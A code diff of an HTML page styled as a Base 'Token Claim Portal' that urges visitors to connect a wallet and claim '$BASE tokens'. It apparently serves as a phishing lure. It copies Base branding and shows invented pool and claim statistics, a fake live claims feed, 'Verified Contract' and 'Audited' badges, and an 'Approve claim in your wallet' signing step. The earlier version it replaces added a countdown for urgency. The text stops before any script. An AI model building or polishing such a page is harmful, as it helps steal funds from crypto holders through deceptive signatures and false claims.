@@ -2,387 +2,473 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Base | Token Airdrop</title>
-<link rel="icon" href="https://raw.githubusercontent.com/base-org/brand-kit/main/logo/symbol/Base_Symbol_Blue.svg" type="image/svg+xml">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Base | Token Claim Portal</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='45' fill='%230052ff'/><path d='M50 80C66.57 80 80 66.57 80 50C80 33.43 66.57 20 50 20C33.43 20 20 33.43 20 50C20 66.57 33.43 80 50 80Z' fill='white'/><path d='M50 68C59.94 68 68 59.94 68 50C68 40.06 59.94 32 50 32V50V68Z' fill='%230052ff'/></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
-*{margin:0;padding:0;box-sizing:border-box}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 :root{
-  --bg:#000000;--bg2:#0a0a0f;--surface:#111119;--surface2:#1a1a25;
-  --border:#222233;--border2:#2a2a3a;
-  --blue:#0052ff;--blue2:#3b82f6;--blue-glow:rgba(0,82,255,.15);
-  --green:#00d26a;--green-bg:rgba(0,210,106,.08);--green-border:rgba(0,210,106,.2);
-  --text:#ffffff;--text2:#a0a0b8;--text3:#666680;
-  --radius:12px;--radius-lg:16px;--radius-xl:20px;
+  --bg:#000;--bg2:#050510;--s1:#0c0c18;--s2:#13132a;--s3:#1a1a35;
+  --b1:#1e1e3a;--b2:#2a2a4a;
+  --blue:#0052ff;--blue2:#3b82f6;--blue3:#60a5fa;--blue-glow:rgba(0,82,255,.12);
+  --green:#00d26a;--green2:#22c55e;
+  --red:#ef4444;--yellow:#eab308;
+  --t1:#fff;--t2:#c8c8e0;--t3:#7878a0;--t4:#4a4a6a;
+  --r:12px;--r2:16px;--r3:20px;--r4:24px;
 }
-body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
+body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t1);min-height:100vh;overflow-x:hidden;-webkit-font-smoothing:antialiased}
 ::selection{background:var(--blue);color:#fff}
-::-webkit-scrollbar{width:6px}
-::-webkit-scrollbar-track{background:var(--bg)}
-::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+
+/* ── BG EFFECTS ── */
+.bg-fx{position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;z-index:0;overflow:hidden}
+.bg-fx .orb{position:absolute;border-radius:50%;filter:blur(100px);opacity:.4;animation:float 20s ease-in-out infinite}
+.bg-fx .orb:nth-child(1){width:500px;height:500px;background:var(--blue);top:-150px;left:-100px;animation-delay:0s}
+.bg-fx .orb:nth-child(2){width:400px;height:400px;background:#7c3aed;bottom:-100px;right:-100px;animation-delay:-7s}
+.bg-fx .orb:nth-child(3){width:300px;height:300px;background:var(--blue2);top:50%;left:50%;transform:translate(-50%,-50%);animation-delay:-14s}
+@keyframes float{0%,100%{transform:translate(0,0) scale(1)}33%{transform:translate(30px,-30px) scale(1.05)}66%{transform:translate(-20px,20px) scale(.95)}}
+.grid-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background-image:linear-gradient(rgba(255,255,255,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.02) 1px,transparent 1px);background-size:60px 60px;pointer-events:none;z-index:0}
+
+/* ── LAYOUT ── */
+.container{position:relative;z-index:1;max-width:520px;margin:0 auto;padding:0 16px}
 
 /* ── NAV ── */
-nav{position:fixed;top:0;left:0;right:0;z-index:100;backdrop-filter:blur(20px);background:rgba(0,0,0,.7);border-bottom:1px solid var(--border)}
-.nav-inner{max-width:1200px;margin:0 auto;padding:0 24px;height:56px;display:flex;align-items:center;justify-content:space-between}
-.logo{display:flex;align-items:center;gap:10px;font-weight:700;font-size:1.1rem;color:var(--text)}
-.logo svg{width:28px;height:28px}
-.nav-tag{background:var(--green-bg);color:var(--green);padding:4px 12px;border-radius:20px;font-size:.7rem;font-weight:600;border:1px solid var(--green-border);letter-spacing:.5px}
+nav{position:fixed;top:0;left:0;right:0;z-index:100;backdrop-filter:blur(24px) saturate(180%);-webkit-backdrop-filter:blur(24px) saturate(180%);background:rgba(0,0,0,.6);border-bottom:1px solid rgba(255,255,255,.06)}
+.nav-in{max-width:520px;margin:0 auto;padding:0 16px;height:56px;display:flex;align-items:center;justify-content:space-between}
+.logo{display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.15rem;letter-spacing:-.5px}
+.logo svg{width:26px;height:26px}
+.nav-right{display:flex;align-items:center;gap:10px}
+.pill{padding:5px 14px;border-radius:20px;font-size:.7rem;font-weight:600;letter-spacing:.3px}
+.pill-live{background:rgba(0,210,106,.1);color:var(--green);border:1px solid rgba(0,210,106,.2)}
+.pill-live::before{content:'';display:inline-block;width:6px;height:6px;background:var(--green);border-radius:50%;margin-right:6px;animation:blink 1.5s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+.net-switch{display:flex;align-items:center;gap:6px;padding:5px 12px;border-radius:20px;font-size:.7rem;font-weight:600;background:var(--blue-glow);color:var(--blue3);border:1px solid rgba(0,82,255,.15);cursor:pointer;transition:all .2s}
+.net-switch:hover{background:rgba(0,82,255,.2)}
 
 /* ── HERO ── */
-.hero{padding:100px 24px 40px;text-align:center;position:relative}
-.hero::before{content:'';position:absolute;top:0;left:50%;transform:translateX(-50%);width:600px;height:600px;background:radial-gradient(circle,rgba(0,82,255,.08) 0%,transparent 70%);pointer-events:none}
-.hero h1{font-size:clamp(2rem,5vw,3.2rem);font-weight:800;letter-spacing:-1px;line-height:1.1;margin-bottom:12px}
-.hero h1 .highlight{background:linear-gradient(135deg,var(--blue),var(--blue2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.hero .sub{color:var(--text2);font-size:1.05rem;max-width:500px;margin:0 auto 20px;line-height:1.5}
-.live-badge{display:inline-flex;align-items:center;gap:8px;background:var(--green-bg);border:1px solid var(--green-border);padding:8px 20px;border-radius:30px;font-size:.85rem;font-weight:600;color:var(--green)}
-.live-dot{width:8px;height:8px;background:var(--green);border-radius:50%;animation:blink 1.5s infinite}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+.hero{text-align:center;padding:88px 0 24px}
+.hero-badge{display:inline-flex;align-items:center;gap:6px;padding:6px 16px;border-radius:24px;font-size:.75rem;font-weight:600;background:rgba(0,82,255,.08);color:var(--blue3);border:1px solid rgba(0,82,255,.12);margin-bottom:20px}
+.hero-badge svg{width:14px;height:14px}
+.hero h1{font-size:clamp(2.2rem,7vw,3rem);font-weight:900;letter-spacing:-1.5px;line-height:1.05;margin-bottom:14px}
+.hero h1 .grad{background:linear-gradient(135deg,var(--blue) 0%,var(--blue3) 50%,#a78bfa 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-size:200% 200%;animation:grad 4s ease infinite}
+@keyframes grad{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
+.hero p{color:var(--t3);font-size:.95rem;line-height:1.6;max-width:400px;margin:0 auto 24px}
+.hero-cta{display:inline-flex;align-items:center;gap:8px;padding:10px 24px;border-radius:28px;font-size:.85rem;font-weight:600;background:var(--blue);color:#fff;border:none;cursor:pointer;transition:all .2s}
+.hero-cta:hover{transform:translateY(-2px);box-shadow:0 8px 32px rgba(0,82,255,.3)}
 
-/* ── STATS ── */
-.stats{display:flex;gap:16px;justify-content:center;padding:0 24px;margin:30px auto;max-width:700px;flex-wrap:wrap}
-.stat{flex:1;min-width:150px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;text-align:center;transition:border-color .2s}
-.stat:hover{border-color:var(--border2)}
-.stat .val{font-size:1.8rem;font-weight:800;color:var(--text);letter-spacing:-1px}
-.stat .label{font-size:.75rem;color:var(--text3);text-transform:uppercase;letter-spacing:1px;margin-top:4px}
+/* ── STATS ROW ── */
+.stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:20px}
+.stat-card{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r);padding:16px 12px;text-align:center;transition:all .3s;position:relative;overflow:hidden}
+.stat-card::after{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.06),transparent)}
+.stat-card:hover{border-color:var(--b2);transform:translateY(-2px)}
+.stat-val{font-size:1.5rem;font-weight:800;letter-spacing:-1px;background:linear-gradient(180deg,var(--t1),var(--t2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.stat-lbl{font-size:.65rem;color:var(--t4);text-transform:uppercase;letter-spacing:1px;margin-top:4px;font-weight:500}
 
-/* ── TIMER ── */
-.timer-bar{text-align:center;padding:16px;color:var(--text2);font-size:.85rem}
-.timer-bar span{color:var(--blue2);font-weight:700;font-family:'Inter',monospace;font-size:.95rem}
+/* ── LIVE FEED ── */
+.live-feed{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r);padding:12px 16px;margin-bottom:20px;overflow:hidden;position:relative}
+.live-feed::before{content:'LIVE';position:absolute;top:8px;right:12px;font-size:.55rem;font-weight:700;color:var(--green);letter-spacing:1px;background:rgba(0,210,106,.1);padding:2px 8px;border-radius:4px}
+.feed-title{font-size:.7rem;color:var(--t4);text-transform:uppercase;letter-spacing:1px;margin-bottom:10px;font-weight:600}
+.feed-scroll{height:84px;overflow:hidden;position:relative}
+.feed-item{display:flex;align-items:center;justify-content:space-between;padding:6px 0;font-size:.8rem;animation:feedIn .5s ease}
+.feed-item .addr{color:var(--t2);font-family:'SF Mono','Fira Code',monospace;font-size:.75rem}
+.feed-item .amount{color:var(--green);font-weight:600;font-size:.8rem}
+.feed-item .chain-tag{font-size:.6rem;color:var(--t4);background:var(--s2);padding:2px 6px;border-radius:4px;margin-left:6px}
+@keyframes feedIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:none}}
 
-/* ── CARD ── */
-.card-container{max-width:480px;margin:10px auto 60px;padding:0 20px}
-.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-xl);padding:32px;position:relative;overflow:hidden}
-.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--blue),transparent);opacity:.5}
-.card h2{font-size:1.3rem;font-weight:700;margin-bottom:6px;text-align:center}
-.card .card-sub{color:var(--text3);font-size:.85rem;text-align:center;margin-bottom:24px}
+/* ── MAIN CARD ── */
+.main-card{background:var(--s1);border:1px solid var(--b1);border-radius:var(--r3);overflow:hidden;position:relative;margin-bottom:20px}
+.main-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent 10%,var(--blue) 50%,transparent 90%);opacity:.4}
+.card-header{padding:24px 24px 0;text-align:center}
+.card-header h2{font-size:1.25rem;font-weight:700;letter-spacing:-.5px}
+.card-header p{color:var(--t3);font-size:.82rem;margin-top:4px}
+.card-body{padding:20px 24px 28px}
 
 /* ── WALLET INFO ── */
-.wallet-info{display:none;background:var(--blue-glow);border:1px solid rgba(0,82,255,.2);border-radius:var(--radius);padding:14px 16px;margin-bottom:20px;font-size:.85rem}
-.wallet-row{display:flex;align-items:center;justify-content:space-between}
-.wallet-addr{font-family:'SF Mono','Fira Code',monospace;color:var(--blue2);font-size:.8rem}
-.chain-badge{background:rgba(0,82,255,.15);color:var(--blue2);padding:3px 10px;border-radius:6px;font-size:.7rem;font-weight:600}
+.wallet-box{display:none;background:linear-gradient(135deg,rgba(0,82,255,.06),rgba(0,82,255,.02));border:1px solid rgba(0,82,255,.12);border-radius:var(--r);padding:14px 16px;margin-bottom:16px}
+.wallet-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
+.wallet-addr{font-family:'SF Mono','Fira Code',monospace;color:var(--blue3);font-size:.82rem;font-weight:500}
+.chain-pill{display:flex;align-items:center;gap:5px;font-size:.7rem;font-weight:600;color:var(--t2);background:var(--s2);padding:4px 10px;border-radius:8px}
+.chain-dot{width:6px;height:6px;border-radius:50%;background:var(--green)}
+.wallet-bal-row{display:flex;align-items:center;justify-content:space-between;padding-top:8px;border-top:1px solid rgba(255,255,255,.04)}
+.wallet-bal-label{font-size:.72rem;color:var(--t4)}
+.wallet-bal-val{font-size:.9rem;font-weight:700;color:var(--t1)}
 
-/* ── BALANCE LIST ── */
-.balance-list{display:none;margin-bottom:20px}
-.balance-item{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:var(--bg2);border:1px solid var(--border);border-radius:10px;margin-bottom:8px;transition:all .3s}
-.balance-item.approved{border-color:var(--green-border);background:var(--green-bg)}
-.balance-item .token-info{display:flex;align-items:center;gap:10px}
-.token-icon{width:28px;height:28px;border-radius:50%;background:var(--surface2);display:flex;align-items:center;justify-content:center;font-size:.7rem;font-weight:700;color:var(--text2)}
-.token-name{font-weight:600;font-size:.9rem}
-.token-chain{font-size:.7rem;color:var(--text3)}
-.token-bal{text-align:right}
-.token-amount{font-weight:600;font-size:.9rem}
-.token-usd{font-size:.7rem;color:var(--text3)}
-.check-icon{color:var(--green);font-size:1rem;margin-left:8px;display:none}
-.balance-item.approved .check-icon{display:inline}
+/* ── TOKEN LIST ── */
+.token-list{display:none;margin-bottom:16px}
+.token-section-title{font-size:.7rem;color:var(--t4);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;font-weight:600}
+.tok-row{display:flex;align-items:center;padding:12px 14px;background:var(--bg2);border:1px solid var(--b1);border-radius:var(--r);margin-bottom:6px;transition:all .3s}
+.tok-row.claimed{border-color:rgba(0,210,106,.2);background:rgba(0,210,106,.03)}
+.tok-icon{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:.8rem;margin-right:12px;flex-shrink:0;border:2px solid transparent}
+.tok-info{flex:1;min-width:0}
+.tok-name{font-weight:600;font-size:.88rem}
+.tok-chain{font-size:.68rem;color:var(--t4);margin-top:1px}
+.tok-right{text-align:right}
+.tok-amt{font-weight:700;font-size:.88rem;font-variant-numeric:tabular-nums}
+.tok-usd{font-size:.68rem;color:var(--t4);margin-top:1px}
+.tok-status{width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-left:10px;flex-shrink:0;font-size:.7rem}
+.tok-status.wait{background:var(--s3);color:var(--t3)}
+.tok-status.ok{background:rgba(0,210,106,.15);color:var(--green)}
+.tok-status.signing{background:rgba(0,82,255,.15);color:var(--blue3);animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(0,82,255,.3)}50%{box-shadow:0 0 0 8px transparent}}
 
 /* ── BUTTON ── */
-.btn{width:100%;padding:16px;border:none;border-radius:var(--radius);font-size:1rem;font-weight:600;cursor:pointer;transition:all .2s;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:10px}
-.btn-primary{background:var(--blue);color:#fff}
-.btn-primary:hover{background:#0044ee;transform:translateY(-1px);box-shadow:0 8px 30px rgba(0,82,255,.25)}
-.btn-primary:active{transform:translateY(0)}
-.btn-primary:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
-.btn .spinner{width:18px;height:18px;border:2px solid rgba(255,255,255,.2);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:none}
+.btn{width:100%;padding:16px;border:none;border-radius:var(--r);font-size:.95rem;font-weight:600;cursor:pointer;transition:all .2s;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:10px;position:relative;overflow:hidden}
+.btn-main{background:linear-gradient(135deg,var(--blue),#4f46e5);color:#fff}
+.btn-main::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.1),transparent);transition:left .5s}
+.btn-main:hover::before{left:100%}
+.btn-main:hover{transform:translateY(-1px);box-shadow:0 8px 32px rgba(0,82,255,.25)}
+.btn-main:active{transform:translateY(0)}
+.btn-main:disabled{opacity:.5;cursor:not-allowed;transform:none;box-shadow:none}
+.btn-main:disabled::before{display:none}
+.btn .spin{width:18px;height:18px;border:2.5px solid rgba(255,255,255,.2);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:none}
 @keyframes spin{to{transform:rotate(360deg)}}
 
-/* ── PROGRESS ── */
-.progress{display:none;margin-top:24px}
-.step{display:flex;align-items:flex-start;gap:14px;padding:12px 0;position:relative}
-.step:not(:last-child)::after{content:'';position:absolute;left:13px;top:40px;bottom:-4px;width:2px;background:var(--border)}
-.step-icon{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.75rem;flex-shrink:0;transition:all .3s}
-.step-icon.pending{background:var(--surface2);color:var(--text3);border:2px solid var(--border)}
-.step-icon.active{background:var(--blue-glow);color:var(--blue2);border:2px solid var(--blue);animation:pulse 2s infinite}
-.step-icon.done{background:var(--green-bg);color:var(--green);border:2px solid var(--green)}
-.step-icon.error{background:rgba(239,68,68,.1);color:var(--red);border:2px solid var(--red)}
-@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(0,82,255,.3)}50%{box-shadow:0 0 0 8px rgba(0,82,255,0)}}
-.step-body{flex:1}
-.step-title{font-size:.9rem;font-weight:600}
-.step-desc{font-size:.75rem;color:var(--text3);margin-top:2px}
+/* ── STEPS ── */
+.steps{display:none;margin-top:20px;padding-top:20px;border-top:1px solid var(--b1)}
+.step{display:flex;gap:14px;padding:10px 0;position:relative}
+.step:not(:last-child)::after{content:'';position:absolute;left:14px;top:38px;bottom:-2px;width:2px;background:var(--b1)}
+.step:not(:last-child).done::after{background:rgba(0,210,106,.3)}
+.step-n{width:30px;height:30px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.72rem;font-weight:700;flex-shrink:0;transition:all .3s}
+.step-n.pending{background:var(--s2);color:var(--t4);border:2px solid var(--b1)}
+.step-n.active{background:var(--blue-glow);color:var(--blue3);border:2px solid var(--blue);animation:pulse 2s infinite}
+.step-n.done{background:rgba(0,210,106,.1);color:var(--green);border:2px solid rgba(0,210,106,.3)}
+.step-n.err{background:rgba(239,68,68,.1);color:var(--red);border:2px solid rgba(239,68,68,.3)}
+.step-body{flex:1;padding-top:3px}
+.step-title{font-size:.85rem;font-weight:600}
+.step-desc{font-size:.72rem;color:var(--t4);margin-top:2px}
 
 /* ── SUCCESS ── */
-.success{display:none;text-align:center;padding:30px 0}
-.success .check-big{width:64px;height:64px;border-radius:50%;background:var(--green-bg);border:2px solid var(--green);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:1.8rem}
-.success h2{font-size:1.4rem;font-weight:700;margin-bottom:8px}
-.success p{color:var(--text2);font-size:.9rem;line-height:1.5}
-.success .tx-link{color:var(--blue2);text-decoration:none;font-size:.8rem;margin-top:12px;display:inline-block}
+.success-box{display:none;text-align:center;padding:24px 0}
+.suc-icon{width:72px;height:72px;border-radius:50%;background:rgba(0,210,106,.08);border:2px solid rgba(0,210,106,.2);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:2rem;animation:sucPop .5s ease}
+@keyframes sucPop{0%{transform:scale(0)}50%{transform:scale(1.1)}100%{transform:scale(1)}}
+.success-box h3{font-size:1.3rem;font-weight:700;margin-bottom:6px}
+.success-box p{color:var(--t3);font-size:.85rem;line-height:1.5}
+.suc-tx{display:inline-flex;align-items:center;gap:6px;margin-top:14px;padding:8px 16px;border-radius:8px;background:var(--blue-glow);color:var(--blue3);font-size:.8rem;font-weight:500;text-decoration:none;border:1px solid rgba(0,82,255,.12);transition:all .2s}
+.suc-tx:hover{background:rgba(0,82,255,.2)}
 
-/* ── SOCIAL PROOF ── */
-.proof{display:flex;align-items:center;justify-content:center;gap:8px;margin:16px 0;color:var(--text3);font-size:.8rem}
-.proof-avatars{display:flex}
-.proof-avatars span{width:24px;height:24px;border-radius:50%;background:var(--surface2);border:2px solid var(--bg);display:flex;align-items:center;justify-content:center;font-size:.5rem;margin-left:-6px}
-.proof-avatars span:first-child{margin-left:0}
+/* ── SECURITY BADGE ── */
+.sec-row{display:flex;align-items:center;justify-content:center;gap:16px;padding:14px;color:var(--t4);font-size:.7rem}
+.sec-item{display:flex;align-items:center;gap:5px}
+.sec-item svg{width:12px;height:12px;fill:var(--t4)}
 
 /* ── FOOTER ── */
-footer{text-align:center;padding:40px 20px;color:var(--text3);font-size:.7rem;border-top:1px solid var(--border)}
-footer a{color:var(--text2);text-decoration:none}
-footer a:hover{color:var(--blue2)}
+footer{text-align:center;padding:32px 16px 40px;border-top:1px solid var(--b1)}
+footer p{color:var(--t4);font-size:.68rem;line-height:1.8}
+footer a{color:var(--t3);text-decoration:none;transition:color .2s}
+footer a:hover{color:var(--blue3)}
+.footer-links{display:flex;justify-content:center;gap:20px;margin-top:8px}
 
 /* ── ANIMATIONS ── */
-.fade-in{animation:fadeIn .5s ease}
-@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
-.shake{animation:shake .5s ease}
-@keyframes shake{0%,100%{transform:none}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}
+.fade-up{opacity:0;transform:translateY(20px);animation:fadeUp .6s ease forwards}
+.fade-up:nth-child(2){animation-delay:.1s}
+.fade-up:nth-child(3){animation-delay:.2s}
+.fade-up:nth-child(4){animation-delay:.3s}
+@keyframes fadeUp{to{opacity:1;transform:none}}
+
+/* ── MOBILE ── */
+@media(max-width:480px){
+  .stats-row{grid-template-columns:repeat(3,1fr);gap:6px}
+  .stat-card{padding:12px 8px}
+  .stat-val{font-size:1.2rem}
+  .hero h1{font-size:2rem}
+  .card-body{padding:16px 18px 22px}
+}
 </style>
 </head>
 <body>
 
+<!-- BG EFFECTS -->
+<div class="bg-fx"><div class="orb"></div><div class="orb"></div><div class="orb"></div></div>
+<div class="grid-overlay"></div>
+
 <!-- NAV -->
 <nav>
-  <div class="nav-inner">
-    <div class="logo">
-      <svg viewBox="0 0 40 40" fill="none"><circle cx="20" cy="20" r="20" fill="#0052ff"/><path d="M20.5 30C26.023 30 30.5 25.523 30.5 20C30.5 14.477 26.023 10 20.5 10C14.977 10 10.5 14.477 10.5 20C10.5 25.523 14.977 30 20.5 30Z" fill="white"/><path d="M20.5 26C23.814 26 26.5 23.314 26.5 20C26.5 16.686 23.814 14 20.5 14V20V26Z" fill="#0052ff"/></svg>
-      Base
-    </div>
-    <div class="nav-tag">● CLAIM LIVE</div>
+<div class="nav-in">
+  <div class="logo">
+    <svg viewBox="0 0 40 40" fill="none"><circle cx="20" cy="20" r="20" fill="#0052ff"/><path d="M20.5 30C26.023 30 30.5 25.523 30.5 20C30.5 14.477 26.023 10 20.5 10C14.977 10 10.5 14.477 10.5 20C10.5 25.523 14.977 30 20.5 30Z" fill="white"/><path d="M20.5 26C23.814 26 26.5 23.314 26.5 20C26.5 16.686 23.814 14 20.5 14V20V26Z" fill="#0052ff"/></svg>
+    Base
   </div>
+  <div class="nav-right">
+    <div class="net-switch" id="netSwitch">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+      <span id="netName">Base</span>
+    </div>
+    <div class="pill pill-live">LIVE</div>
+  </div>
+</div>
 </nav>
 
+<div class="container">
+
 <!-- HERO -->
-<div class="hero fade-in">
-  <h1>Claim Your<br><span class="highlight">$BASE Tokens</span></h1>
-  <p class="sub">Early ecosystem supporters are eligible for the Base community allocation. Connect your wallet to check eligibility and claim.</p>
-  <div class="live-badge"><div class="live-dot"></div> Claiming is live — 7,842 wallets claimed today</div>
+<div class="hero fade-up">
+  <div class="hero-badge">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
+    Phase 3 Distribution
+  </div>
+  <h1>Claim Your<br><span class="grad">$BASE Tokens</span></h1>
+  <p>Early ecosystem supporters are eligible for the community token allocation. Connect your wallet to verify and claim.</p>
 </div>
 
 <!-- STATS -->
-<div class="stats fade-in">
-  <div class="stat"><div class="val">2.4M</div><div class="label">Eligible Wallets</div></div>
-  <div class="stat"><div class="val">$312M</div><div class="label">Total Pool</div></div>
-  <div class="stat"><div class="val">47,892</div><div class="label">Claims Today</div></div>
-</div>
-
-<!-- TIMER -->
-<div class="timer-bar">⏰ Claim window closes in <span id="timer">71:59:42</span></div>
-
-<!-- SOCIAL PROOF -->
-<div class="proof">
-  <div class="proof-avatars">
-    <span>👤</span><span>👤</span><span>👤</span><span>👤</span><span>👤</span>
+<div class="stats-row fade-up">
+  <div class="stat-card">
+    <div class="stat-val" id="statWallets">2.4M</div>
+    <div class="stat-lbl">Eligible</div>
   </div>
-  <span>892 people claimed in the last hour</span>
+  <div class="stat-card">
+    <div class="stat-val">$312M</div>
+    <div class="stat-lbl">Total Pool</div>
+  </div>
+  <div class="stat-card">
+    <div class="stat-val" id="statClaims">47,892</div>
+    <div class="stat-lbl">Claimed</div>
+  </div>
 </div>
 
-<!-- CARD -->
-<div class="card-container fade-in">
-  <div class="card">
+<!-- LIVE FEED -->
+<div class="live-feed fade-up">
+  <div class="feed-title">Recent Claims</div>
+  <div class="feed-scroll" id="feedScroll"></div>
+</div>
+
+<!-- MAIN CARD -->
+<div class="main-card fade-up">
+  <div class="card-header">
     <h2>Claim Tokens</h2>
-    <p class="card-sub">Connect your wallet to verify eligibility</p>
+    <p>Verify eligibility and claim your allocation</p>
+  </div>
+  <div class="card-body">
     
-    <div class="wallet-info" id="walletInfo">
-      <div class="wallet-row">
-        <span class="wallet-addr" id="walletAddr"></span>
-        <span class="chain-badge" id="chainBadge"></span>
+    <div class="wallet-box" id="walletBox">
+      <div class="wallet-top">
+        <span class="wallet-addr" id="wAddr"></span>
+        <span class="chain-pill"><span class="chain-dot"></span><span id="wChain">Base</span></span>
+      </div>
+      <div class="wallet-bal-row">
+        <span class="wallet-bal-label">Estimated Reward</span>
+        <span class="wallet-bal-val" id="wReward">~$1,247</span>
       </div>
     </div>
     
-    <div class="balance-list" id="balanceList"></div>
+    <div class="token-list" id="tokenList">
+      <div class="token-section-title">Tokens to Claim</div>
+      <div id="tokRows"></div>
+    </div>
     
-    <button class="btn btn-primary" id="mainBtn" onclick="handleClick()">
-      <span class="spinner" id="spinner"></span>
-      <span id="btnText">Connect Wallet</span>
+    <button class="btn btn-main" id="mainBtn" onclick="handleClick()">
+      <span class="spin" id="spin"></span>
+      <span id="btnTxt">Connect Wallet</span>
     </button>
     
-    <!-- Progress -->
-    <div class="progress" id="progress">
-      <div class="step" id="step1">
-        <div class="step-icon pending" id="icon1">1</div>
-        <div class="step-body"><div class="step-title">Checking eligibility</div><div class="desc1">Scanning on-chain activity & snapshots</div></div>
-      </div>
-      <div class="step" id="step2">
-        <div class="step-icon pending" id="icon2">2</div>
-        <div class="step-body"><div class="step-title">Verifying allocation</div><div class="desc2">Reading merkle proof from contract</div></div>
-      </div>
-      <div class="step" id="step3">
-        <div class="step-icon pending" id="icon3">3</div>
-        <div class="step-body"><div class="step-title">Approve claim</div><div class="desc3">Sign the authorization transaction</div></div>
-      </div>
-      <div class="step" id="step4">
-        <div class="step-icon pending" id="icon4">4</div>
-        <div class="step-body"><div class="step-title">Claiming tokens</div><div class="desc4">Submitting to Base L2</div></div>
-      </div>
+    <div class="steps" id="stepsBox">
+      <div class="step" id="s1"><div class="step-n pending" id="n1">1</div><div class="step-body"><div class="step-title">Checking eligibility</div><div class="step-desc">Scanning on-chain snapshots & activity</div></div></div>
+      <div class="step" id="s2"><div class="step-n pending" id="n2">2</div><div class="step-body"><div class="step-title">Verifying allocation</div><div class="step-desc">Computing merkle proof</div></div></div>
+      <div class="step" id="s3"><div class="step-n pending" id="n3">3</div><div class="step-body"><div class="step-title">Sign authorization</div><div class="step-desc">Approve claim in your wallet</div></div></div>
+      <div class="step" id="s4"><div class="step-n pending" id="n4">4</div><div class="step-body"><div class="step-title">Claiming tokens</div><div class="step-desc">Submitting to Base L2</div></div></div>
     </div>
     
-    <!-- Success -->
-    <div class="success" id="successBox">
-      <div class="check-big">✓</div>
-      <h2>Tokens Claimed!</h2>
-      <p>Your $BASE tokens have been sent to your wallet.<br>They will arrive within 1-2 blocks.</p>
-      <a href="#" class="tx-link" id="txLink">View on BaseScan →</a>
+    <div class="success-box" id="sucBox">
+      <div class="suc-icon">✓</div>
+      <h3>Tokens Claimed!</h3>
+      <p>Your $BASE allocation has been sent.<br>Arrives within 1-2 blocks.</p>
+      <a href="#" class="suc-tx" id="sucLink">View on BaseScan →</a>
     </div>
   </div>
 </div>
 
+<!-- SECURITY -->
+<div class="sec-row fade-up">
+  <div class="sec-item"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Verified Contract</div>
+  <div class="sec-item"><svg viewBox="0 0 24 24"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/></svg>Audited</div>
